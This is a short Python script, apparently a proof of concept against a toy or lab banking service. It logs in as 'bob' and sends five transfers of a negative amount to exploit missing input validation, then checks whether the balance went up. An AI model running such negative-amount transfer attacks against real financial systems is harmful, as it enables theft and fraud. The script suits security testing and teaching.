# attack_negative_transfer.py
from bank_client import BankClient

c = BankClient()
print("bob login:", c.cmd("LOGIN bob 12345"))
print("Balance before:", c.cmd("BALANCE"))

for i in range(5):
    resp = c.cmd(f"TRANSFER 2 -1000 hacker_{i}")
    print(f"  {resp}")

print("Balance after:", c.cmd("BALANCE"))
c.close()
